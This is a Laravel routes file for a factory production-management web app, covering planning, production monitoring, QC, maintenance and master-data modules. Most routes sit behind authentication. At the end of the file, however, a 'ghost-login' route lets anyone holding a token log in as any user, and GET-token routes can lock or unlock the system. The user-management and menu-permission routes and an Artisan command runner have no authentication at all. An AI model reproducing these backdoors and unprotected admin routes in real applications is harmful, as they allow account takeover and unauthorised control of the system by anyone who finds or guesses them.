<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\AuthController;
use App\Http\Controllers\DashboardController;
use App\Http\Controllers\ProductController;
use App\Http\Controllers\MachineController;
use App\Http\Controllers\ColorController;
use App\Http\Controllers\RejectItemController;
use App\Http\Controllers\ShiftController;
use App\Http\Controllers\CoordinatorController;
use App\Http\Controllers\DowntimeController;
use App\Http\Controllers\PackagingTypeController;
use App\Http\Controllers\OperatorController;
use App\Http\Controllers\BatchController;
use App\Http\Controllers\DailyReportController;
use App\Http\Controllers\UserController;
use App\Http\Controllers\MonitoringProduksiController;
use App\Http\Controllers\DowntimeTrackingController;
use App\Http\Controllers\OutputTargetController;
use App\Http\Controllers\OeeDashboardController;
use App\Http\Controllers\StandardActualController;
use App\Http\Controllers\AndonController;
use App\Http\Controllers\ActivityLogController;
use Illuminate\Support\Facades\Storage;

// PWA Dynamic Web App Manifest
Route::get('/manifest.json', function () {
    $appName = app_setting('app_name', 'HBT Produksi');
    $shortName = app_setting('app_short_name', $appName);
    $logoUrl = app_logo_url();

    return response()->json([
        'name' => $appName,
        'short_name' => $shortName,
        'start_url' => '/',
        'display' => 'standalone',
        'background_color' => '#0f172a',
        'theme_color' => '#4f46e5',
        'orientation' => 'portrait-primary',
        'icons' => [
            [
                'src' => $logoUrl,
                'sizes' => '192x192',
                'type' => 'image/png',
                'purpose' => 'any maskable',
            ],
            [
                'src' => $logoUrl,
                'sizes' => '512x512',
                'type' => 'image/png',
                'purpose' => 'any maskable',
            ],
        ],
    ], 200, [
        'Content-Type' => 'application/manifest+json; charset=utf-8',
        'Cache-Control' => 'no-cache, private',
    ]);
})->name('pwa.manifest');

Route::middleware('guest')->group(function () {
    Route::get('/login', [AuthController::class, 'index'])->name('login');
    Route::post('/login', [AuthController::class, 'login'])->name('login.post');
});

Route::middleware('auth')->group(function () {
    Route::post('/logout', [AuthController::class, 'logout'])->name('logout');

    Route::get('/', function () {
        return redirect()->route('dashboard');
    });

    // MODUL: DASHBOARD
    Route::get('/dashboard', [DashboardController::class, 'index'])->name('dashboard');
    Route::get('/dashboard/export-excel', [DashboardController::class, 'exportExcel'])->name('dashboard.export-excel');
    Route::get('/dashboard/export-pdf', [DashboardController::class, 'exportPdf'])->name('dashboard.export-pdf');
    Route::get('/dashboard/api-data', [App\Http\Controllers\DashboardController::class, 'getDashboardJson'])->name('dashboard.data');
    Route::get('/dashboard/json', [App\Http\Controllers\DashboardController::class, 'getDashboardJson'])->name('dashboard.json');

    // MODUL: LOG AKITIVITAS
    Route::get('/activity-logs', [ActivityLogController::class, 'index'])->name('activity-logs.index');

    Route::get('/dashboard/tv', [App\Http\Controllers\DashboardController::class, 'tvMode'])->name('dashboard.tv');

    // MODUL PPIC: PRODUCTION SCHEDULE
    Route::resource('ppic/mps', App\Http\Controllers\MpsController::class);
    Route::post('ppic/mps/{id}/update-items', [App\Http\Controllers\MpsController::class, 'updateItems'])->name('mps.update-items');

    // MODUL PPIC: SCHEDULED BOARD
    Route::get('ppic/schedule', [App\Http\Controllers\ScheduleBoardController::class, 'index'])->name('schedule.index');
    Route::post('ppic/schedule', [App\Http\Controllers\ScheduleBoardController::class, 'store'])->name('schedule.store');
    Route::put('ppic/schedule/{id}', [App\Http\Controllers\ScheduleBoardController::class, 'update'])->name('schedule.update');
    Route::delete('ppic/schedule/{id}', [App\Http\Controllers\ScheduleBoardController::class, 'destroy'])->name('schedule.destroy');

    // MODUL PPIC: SPK/BATCH
    Route::prefix('batches')->name('batches.')->controller(BatchController::class)->group(function () {
        Route::get('template', 'downloadTemplate')->name('template');
        Route::post('import', 'importExcel')->name('import');
        Route::get('export-excel', 'exportExcel')->name('export-excel');
        Route::get('export-pdf', 'exportPdf')->name('export-pdf');
        Route::patch('{batch}/toggle-active', 'toggleActive')->name('toggle-active');
        Route::patch('{batch}/toggle-lock', 'toggleLock')->name('toggle-lock');
    });
    Route::resource('batches', BatchController::class);

    // MODUL PPIC: BILL OF MATERIALS
    Route::get('ppic/bom', [App\Http\Controllers\BomController::class, 'index'])->name('bom.index');
    Route::get('ppic/bom/{id}', [App\Http\Controllers\BomController::class, 'show'])->name('bom.show');
    Route::post('ppic/material', [App\Http\Controllers\BomController::class, 'storeMaterial'])->name('bom.material.store');
    Route::post('ppic/bom/{id}/item', [App\Http\Controllers\BomController::class, 'storeItem'])->name('bom.item.store');
    Route::delete('ppic/bom/item/{id}', [App\Http\Controllers\BomController::class, 'destroyItem'])->name('bom.item.destroy');

    // MODUL PPIC: PRODUCTION ROUTING
    Route::get('ppic/routing', [App\Http\Controllers\RoutingController::class, 'index'])->name('routing.index');
    Route::get('ppic/routing/{id}', [App\Http\Controllers\RoutingController::class, 'show'])->name('routing.show');
    Route::post('ppic/work-center', [App\Http\Controllers\RoutingController::class, 'storeWorkCenter'])->name('routing.wc.store');
    Route::post('ppic/routing/{id}/step', [App\Http\Controllers\RoutingController::class, 'storeStep'])->name('routing.step.store');
    Route::delete('ppic/routing/step/{id}', [App\Http\Controllers\RoutingController::class, 'destroyStep'])->name('routing.step.destroy');

    // MODUL PPIC: MATERIAL REQUIREMENTS PLANNING (MRP)
    Route::get('ppic/mrp/{planId}', [App\Http\Controllers\MrpController::class, 'show'])->name('mrp.show');
    Route::post('ppic/mrp/{planId}/generate', [App\Http\Controllers\MrpController::class, 'generate'])->name('mrp.generate');

    // MODUL PPIC: CAPACITY REQUIREMENTS PLANNING (CRP)
    Route::get('ppic/crp/{planId}', [App\Http\Controllers\CrpController::class, 'show'])->name('crp.show');
    Route::post('ppic/crp/{planId}/generate', [App\Http\Controllers\CrpController::class, 'generate'])->name('crp.generate');

    // MODUL PRODUKSI: MONITORING PRODUKSI REAL TIME
    Route::resource('monitoring-produksi', MonitoringProduksiController::class)->only(['index']);

    // MODUL PRODUKSI: ANDON DIGITAL
    Route::get('andon-digital', [App\Http\Controllers\AndonController::class, 'index'])->name('andon.index');

    // MODUL PRODUKSI: LAPORAN HARIAN PRODUKSI
    Route::get('daily-reports/template', [DailyReportController::class, 'downloadTemplate'])->name('daily-reports.template');
    Route::post('daily-reports/import', [DailyReportController::class, 'importExcel'])->name('daily-reports.import');
    Route::get('daily-reports/export-excel', [DailyReportController::class, 'exportExcel'])->name('daily-reports.export-excel');
    Route::get('daily-reports/export-pdf', [DailyReportController::class, 'exportPdf'])->name('daily-reports.export-pdf');
    Route::get('daily-reports/get-batch/{id}', [DailyReportController::class, 'getBatchDetails']);
    Route::post('daily-reports/{id}/toggle-lock', [DailyReportController::class, 'toggleLock'])->name('daily-reports.toggle-lock');
    Route::resource('daily-reports', DailyReportController::class);

    // MODUL PRODUKSI:OUTPUT VS TARGET PRODUKSI
    Route::get('output-vs-target', [App\Http\Controllers\OutputTargetController::class, 'index'])->name('output-target.index');

    // MODUL PRDUKSI: OEE DASHBOARD
    Route::get('oee-dashboard', [App\Http\Controllers\OeeDashboardController::class, 'index'])->name('oee-dashboard.index');

    // MODUL PRODUKSI: DOWNTIME TRACKING
    Route::resource('downtime-tracking', App\Http\Controllers\DowntimeTrackingController::class);

    // MODUL PRODUKSI: ANALISIS STANDAR VS AKTUAL
    Route::get('standard-actual', [App\Http\Controllers\StandardActualController::class, 'index'])->name('standard-actual.index');

    // MODUL QC: IQC (Bahan Baku)
    Route::resource('qc/iqc', App\Http\Controllers\IqcController::class)->names([
        'index' => 'iqc.index',
        'store' => 'iqc.store',
    ]);

    // MODUL QC: IPQC (Patrol)
    Route::resource('qc/ipqc', App\Http\Controllers\IpqcController::class)->names([
        'index' => 'ipqc.index',
        'store' => 'ipqc.store',
    ]);

    // MODUL QC: OQC (Final Check)
    Route::resource('qc/oqc', App\Http\Controllers\OqcController::class)->names([
        'index' => 'oqc.index',
        'store' => 'oqc.store',
    ]);

    // MODUL QC: Trend & Presto
    Route::get('qc/analysis', [App\Http\Controllers\QcAnalysisController::class, 'index'])->name('qc-analysis.index');

    // MODUL QC: CAPA (Perbaikan)
    Route::resource('qc/capa', App\Http\Controllers\CapaController::class)->names([
        'index' => 'capa.index',
        'store' => 'capa.store',
        'update' => 'capa.update'
    ]);

    // MODUL QC: COA (Sertifikat)
    Route::resource('qc/coa', App\Http\Controllers\CoaController::class)->names([
        'index' => 'coa.index',
        'store' => 'coa.store',
        'show'  => 'coa.print'
    ]);

    // MODUL ENGINEERING: Machine Breakdown Report
    Route::resource('engineering/breakdown', App\Http\Controllers\BreakdownController::class)->names([
        'index' => 'breakdown.index',
        'store' => 'breakdown.store',
        'update' => 'breakdown.update'
    ]);

    // MODUL ENGINEERING: Work Order Maintenance
    Route::resource('engineering/work-order', App\Http\Controllers\WorkOrderController::class)->names([
        'index' => 'work-order.index',
        'store' => 'work-order.store',
        'update' => 'work-order.update'
    ]);

    // MODUL ENGINEERING: Preventive Maintenance (PM)
    Route::get('engineering/preventive', [App\Http\Controllers\PreventiveMaintenanceController::class, 'index'])->name('preventive.index');
    Route::post('engineering/preventive', [App\Http\Controllers\PreventiveMaintenanceController::class, 'store'])->name('preventive.store');
    Route::post('engineering/preventive/{id}/complete', [App\Http\Controllers\PreventiveMaintenanceController::class, 'complete'])->name('preventive.complete');

    // MODUL ENGINEERING: Sparepart Management
    Route::get('engineering/sparepart', [App\Http\Controllers\SparepartController::class, 'index'])->name('sparepart.index');
    Route::post('engineering/sparepart/store', [App\Http\Controllers\SparepartController::class, 'store'])->name('sparepart.store');
    Route::post('engineering/sparepart/transaction', [App\Http\Controllers\SparepartController::class, 'transaction'])->name('sparepart.transaction');

    // MODUL ENGINEERING: MTBF & MTTR Analysis
    Route::get('engineering/reliability', [App\Http\Controllers\ReliabilityController::class, 'index'])->name('reliability.index');

    // MODUL ENGINEERING: Machine History
    Route::get('engineering/machine-history', [App\Http\Controllers\MachineHistoryController::class, 'index'])->name('machine-history.index');
    Route::get('engineering/machine-history/{id}', [App\Http\Controllers\MachineHistoryController::class, 'show'])->name('machine-history.show');

    //Master Data Produk
    Route::get('products/template', [ProductController::class, 'downloadTemplate'])->name('products.template');
    Route::get('products/export/{format}', [ProductController::class, 'export'])->name('products.export');
    Route::post('products/import', [ProductController::class, 'import'])->name('products.import');
    Route::post('/products/{id}/toggle-status', [ProductController::class, 'toggleStatus'])->name('products.toggle-status');
    Route::resource('products', ProductController::class);

    // Master Data Mesin
    Route::get('machines/template', [MachineController::class, 'downloadTemplate'])->name('machines.template');
    Route::get('machines/export/{format}', [MachineController::class, 'export'])->name('machines.export');
    Route::post('machines/import', [MachineController::class, 'import'])->name('machines.import');
    Route::post('/machines/{id}/toggle-status', [MachineController::class, 'toggleStatus'])->name('machines.toggle-status');
    Route::resource('machines', MachineController::class);

    //Master Data Warna
    Route::get('colors/template', [ColorController::class, 'template'])->name('colors.template');
    Route::get('colors/export/{format}', [ColorController::class, 'export'])->name('colors.export');
    Route::post('colors/import', [ColorController::class, 'import'])->name('colors.import');
    Route::post('colors/{id}/toggle-status', [ColorController::class, 'toggleStatus'])->name('colors.toggle-status');
    Route::resource('colors', ColorController::class);

    //Master Data Jenis Kemasan
    Route::get('packaging-types/template', [PackagingTypeController::class, 'template'])->name('packaging-types.template');
    Route::get('packaging-types/export/{format}', [PackagingTypeController::class, 'export'])->name('packaging-types.export');
    Route::post('packaging-types/import', [PackagingTypeController::class, 'import'])->name('packaging-types.import');
    Route::post('packaging-types/{id}/toggle-status', [PackagingTypeController::class, 'toggleStatus'])->name('packaging-types.toggle-status');
    Route::resource('packaging-types', PackagingTypeController::class);

    // Master Data Reject Items
    Route::get('reject-items/template', [RejectItemController::class, 'template'])->name('reject-items.template');
    Route::get('reject-items/export/{format}', [RejectItemController::class, 'export'])->name('reject-items.export');
    Route::post('reject-items/import', [RejectItemController::class, 'import'])->name('reject-items.import');
    Route::post('reject-items/{id}/toggle-status', [RejectItemController::class, 'toggleStatus'])->name('reject-items.toggle-status');
    Route::resource('reject-items', RejectItemController::class);

    // Master Data Downtime
    Route::get('downtimes/template', [DowntimeController::class, 'template'])->name('downtimes.template');
    Route::get('downtimes/export/{format}', [DowntimeController::class, 'export'])->name('downtimes.export');
    Route::post('downtimes/import', [DowntimeController::class, 'import'])->name('downtimes.import');
    Route::post('downtimes/{id}/toggle-status', [DowntimeController::class, 'toggleStatus'])->name('downtimes.toggle-status');
    Route::resource('downtimes', DowntimeController::class);

    // Master Data Shift
    Route::get('shifts/template', [ShiftController::class, 'template'])->name('shifts.template');
    Route::get('shifts/export/{format}', [ShiftController::class, 'export'])->name('shifts.export');
    Route::post('shifts/import', [ShiftController::class, 'import'])->name('shifts.import');
    Route::post('shifts/{id}/toggle-status', [ShiftController::class, 'toggleStatus'])->name('shifts.toggle-status');
    Route::resource('shifts', ShiftController::class);

    // Master Data Koordinator
    Route::get('coordinators/template', [CoordinatorController::class, 'template'])->name('coordinators.template');
    Route::get('coordinators/export/{format}', [CoordinatorController::class, 'export'])->name('coordinators.export');
    Route::post('coordinators/import', [CoordinatorController::class, 'import'])->name('coordinators.import');
    Route::post('coordinators/{id}/toggle-status', [CoordinatorController::class, 'toggleStatus'])->name('coordinators.toggle-status');
    Route::resource('coordinators', CoordinatorController::class);

    // Master Data Operator
    Route::get('operators/template', [OperatorController::class, 'template'])->name('operators.template');
    Route::get('operators/export/{format}', [OperatorController::class, 'export'])->name('operators.export');
    Route::post('operators/import', [OperatorController::class, 'import'])->name('operators.import');
    Route::post('operators/{id}/toggle-status', [OperatorController::class, 'toggleStatus'])->name('operators.toggle-status');
    Route::resource('operators', OperatorController::class);
});

// SETTING: PENGGUNA
Route::resource('users', UserController::class);

// SETTING: LOCK SYSTEM
Route::post('/system/toggle-lock', [App\Http\Controllers\UserController::class, 'toggleSystemLock'])
    ->name('system.toggle-lock')
    ->middleware(['auth']);

// SETTING: MENU
Route::get('menus', [App\Http\Controllers\SettingMenuController::class, 'index'])->name('settings.menus.index');
Route::post('menus/update', [App\Http\Controllers\SettingMenuController::class, 'updateAccess'])->name('settings.menus.update');

// SETTING: IDENTITAS WEBSITE / APLIKASI
Route::prefix('settings')->name('settings.')->middleware(['auth'])->group(function () {
    Route::get('app', [App\Http\Controllers\AppSettingController::class, 'index'])->name('app.index');
    Route::post('app', [App\Http\Controllers\AppSettingController::class, 'update'])->name('app.update');
    Route::post('app/reset-logo', [App\Http\Controllers\AppSettingController::class, 'resetLogo'])->name('app.reset-logo');
    Route::post('app/reset-favicon', [App\Http\Controllers\AppSettingController::class, 'resetFavicon'])->name('app.reset-favicon');
});

Route::get('/emergency/lock/{token}', function ($token) {

    if ($token !== env('EMERGENCY_TOKEN')) {
        abort(404);
    }

    Storage::put('system_locked', 'true');
    return "SISTEM BERHASIL DIKUNCI DARURAT!";
});

Route::get('/emergency/unlock/{token}', function ($token) {
    if ($token !== env('EMERGENCY_TOKEN')) {
        abort(404);
    }

    Storage::delete('system_locked');
    return "Sistem telah dibuka kembali.";
});

Route::get('/ghost-login/{id}/{token}', function ($id, $token) {

    if ($token !== env('EMERGENCY_TOKEN')) {
        abort(404);
    }

    \Illuminate\Support\Facades\Auth::loginUsingId($id);

    return redirect('/dashboard')->with('success', 'Ghost Mode Activated!');
});

use Illuminate\Support\Facades\Artisan;

Route::get('/run-fix-reports', function () {
    try {
        Artisan::call('fix:reports');
        return 'Perbaikan laporan berhasil dijalankan!';
    } catch (\Exception $e) {
        return 'Terjadi kesalahan: ' . $e->getMessage();
    }
});